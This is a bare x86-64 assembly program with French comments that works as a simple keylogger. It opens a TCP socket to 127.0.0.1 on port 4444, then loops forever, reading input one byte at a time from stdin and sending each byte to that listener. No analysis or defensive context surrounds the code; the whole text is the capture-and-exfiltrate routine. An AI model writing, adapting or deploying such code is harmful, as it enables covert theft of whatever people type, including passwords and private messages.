section .bss
    key_buffer resb 1
    socket resq 1
    server resb 16

section .data
    ip_address db "127.0.0.1", 0
    port dw 4444

section .text
    global _start

_start:
    ; 1. Créer un socket
    mov rax, 41      ; syscall socket
    mov rdi, 2       ; AF_INET
    mov rsi, 1       ; SOCK_STREAM
    mov rdx, 0       ; IPPROTO_IP
    syscall
    mov [socket], rax

    ; 2. Configurer l'adresse du serveur
    mov word [server], 2     ; AF_INET
    mov word [server+2], 0x5c11 ; Port 4444
    mov dword [server+4], 0x0100007F ; 127.0.0.1 en hex

    ; 3. Connecter au serveur
    mov rax, 42
    mov rdi, [socket]
    lea rsi, [server]
    mov rdx, 16
    syscall

read_keys:
    ; 4. Lire une touche
    mov rax, 0    ; syscall read
    mov rdi, 0    ; stdin
    mov rsi, key_buffer
    mov rdx, 1
    syscall

    ; 5. Envoyer la touche au serveur
    mov rax, 1    ; syscall write
    mov rdi, [socket]  ; socket du serveur
    mov rsi, key_buffer
    mov rdx, 1
    syscall

    jmp read_keys  ; Boucle infinie pour capturer les frappes
